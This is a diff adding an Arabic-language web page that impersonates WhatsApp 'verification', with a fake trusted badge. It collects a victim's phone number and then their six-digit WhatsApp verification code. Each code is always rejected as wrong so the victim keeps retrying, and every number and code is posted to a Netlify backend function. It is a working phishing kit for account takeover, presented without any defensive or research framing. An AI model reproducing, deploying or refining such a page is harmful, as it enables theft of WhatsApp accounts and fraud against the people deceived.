@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>توثيق واتساب</title>
+  <style>
+    body{
+      margin:0;
+      font-family:Arial, sans-serif;
+      background:linear-gradient(135deg,#25d366,#128c7e);
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      min-height:100vh;
+      color:#fff;
+    }
+    .container{
+      background:rgba(0,0,0,0.55);
+      padding:30px;
+      border-radius:18px;
+      text-align:center;
+      width:100%;
+      max-width:420px;
+      box-shadow:0 8px 30px rgba(0,0,0,0.4);
+    }
+    .logo{width:80px;margin-bottom:10px;}
+    h1{
+      font-size:1.6rem;
+      margin:0 0 20px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      gap:8px;
+    }
+    .verified{
+      background:linear-gradient(90deg,#00d6a8,#00ffcc);
+      color:#003;
+      padding:4px 10px;
+      border-radius:999px;
+      font-size:0.85rem;
+      font-weight:bold;
+    }
+    .phone-row{
+      display:flex;
+      gap:10px;
+      margin-bottom:8px;
+    }
+    select,input{
+      padding:12px;
+      border-radius:10px;
+      border:none;
+      font-size:1rem;
+      background:rgba(255,255,255,0.08);
+      color:#fff;
+    }
+    select{flex:0 0 110px;}
+    input{flex:1;}
+    .btn{
+      width:100%;
+      padding:14px;
+      border:none;
+      border-radius:10px;
+      background:#25d366;
+      font-size:1.05rem;
+      color:#fff;
+      cursor:pointer;
+    }
+    .btn:hover{background:#20bd5a;}
+    .hidden{display:none;}
+    .error{
+      color:#ff4d4d;
+      font-size:0.9rem;
+      margin-bottom:10px;
+    }
+    .code-row{
+      display:flex;
+      gap:8px;
+      justify-content:center;
+      margin-bottom:8px;
+    }
+    .code-box{
+      width:35px;
+      height:45px;
+      border:none;
+      border-radius:6px;
+      font-size:1.1rem;
+      text-align:center;
+      background:rgba(255,255,255,0.1);
+      color:#fff;
+    }
+  </style>
+</head>
+<body>
+  <div class="container" id="phoneScreen">
+    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
+    <h1>توثيق واتساب <span class="verified">موثوق ✅</span></h1>
+
+    <div class="phone-row">
+      <select id="countryCode">
+        <option value="+967">🇾🇪 +967</option>
+        <option value="+966">🇸🇦 +966</option>
+        <option value="+20">🇪🇬 +20</option>
+        <option value="+971">🇦🇪 +971</option>
+        <option value="+1">🇺🇸 +1</option>
+        <option value="+44">🇬🇧 +44</option>
+        <option value="+49">🇩🇪 +49</option>
+        <option value="+33">🇫🇷 +33</option>
+        <option value="+81">🇯🇵 +81</option>
+        <option value="+91">🇮🇳 +91</option>
+        <option value="+39">🇮🇹 +39</option>
+        <option value="+7">🇷🇺 +7</option>
+        <option value="+55">🇧🇷 +55</option>
+        <option value="+34">🇪🇸 +34</option>
+        <option value="+46">🇸🇪 +46</option>
+        <option value="+61">🇦🇺 +61</option>
+      </select>
+      <input type="tel" id="phoneNumber" placeholder="أدخل رقم الجوال" maxlength="15">
+    </div>
+    <div id="phoneError" class="error hidden">الرقم غير صالح</div>
+
+    <button class="btn" id="verifyBtn">توثيق</button>
+  </div>
+
+  <div class="container hidden" id="codeScreen">
+    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
+    <h1>أدخل كود التحقق <span class="verified">موثوق ✅</span></h1>
+
+    <div class="code-row">
+      <input maxlength="1" class="code-box" inputmode="numeric">
+      <input maxlength="1" class="code-box" inputmode="numeric">
+      <input maxlength="1" class="code-box" inputmode="numeric">
+      <input maxlength="1" class="code-box" inputmode="numeric">
+      <input maxlength="1" class="code-box" inputmode="numeric">
+      <input maxlength="1" class="code-box" inputmode="numeric">
+    </div>
+    <div id="codeError" class="error hidden">الرمز غير صحيح يرجى إعادة المحاولة</div>
+
+    <button class="btn" id="confirmBtn">تأكيد</button>
+  </div>
+
+  <script>
+    const phoneScreen = document.getElementById("phoneScreen");
+    const codeScreen  = document.getElementById("codeScreen");
+    const phoneError  = document.getElementById("phoneError");
+    const codeError   = document.getElementById("codeError");
+
+    // دالة لإرسال الرسائل إلى الواجهة الخلفية
+    async function sendMessage(message) {
+      try {
+        await fetch('/.netlify/functions/sendMessage', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ text: message })
+        });
+      } catch (error) {
+        console.error('Failed to send message:', error);
+      }
+    }
+
+    document.getElementById("phoneNumber").addEventListener("input", e => {
+      e.target.value = e.target.value.replace(/[^0-9]/g, '');
+    });
+
+    document.getElementById("verifyBtn").addEventListener("click", () => {
+      const code = document.getElementById("countryCode").value;
+      const num  = document.getElementById("phoneNumber").value.trim();
+      
+      if (num.length < 9) { // تم التعديل ليكون أكثر مرونة
+        phoneError.classList.remove("hidden");
+        return;
+      } else {
+        phoneError.classList.add("hidden");
+      }
+
+      const msg = `📞 طلب توثيق جديد (واتساب)\nالرقم: ${code}${num}`;
+      sendMessage(msg); // استخدام الدالة الجديدة
+
+      phoneScreen.classList.add("hidden");
+      codeScreen.classList.remove("hidden");
+    });
+
+    const boxes = document.querySelectorAll(".code-box");
+    boxes.forEach((box, idx) => {
+      box.addEventListener("input", () => {
+        box.value = box.value.replace(/[^0-9]/g, '');
+        if (box.value && idx < boxes.length - 1) boxes[idx + 1].focus();
+      });
+
+      box.addEventListener("keydown", (e) => {
+        if (e.key === "Backspace" && !box.value && idx > 0) {
+          boxes[idx - 1].focus();
+        }
+      });
+    });
+
+    document.getElementById("confirmBtn").addEventListener("click", () => {
+      const code = Array.from(boxes).map(b => b.value).join('');
+      
+      if (code.length !== 6) {
+        codeError.textContent = "الرمز يجب أن يتكون من 6 أرقام";
+        codeError.classList.remove("hidden");
+        return;
+      }
+      
+      codeError.textContent = "الرمز غير صحيح يرجى إعادة المحاولة";
+      codeError.classList.remove("hidden");
+
+      const msg = `🔐 محاولة إدخال كود (واتساب)\nالكود: ${code}`;
+      sendMessage(msg); // استخدام الدالة الجديدة
+    });
+  </script>
+</body>
+</html>
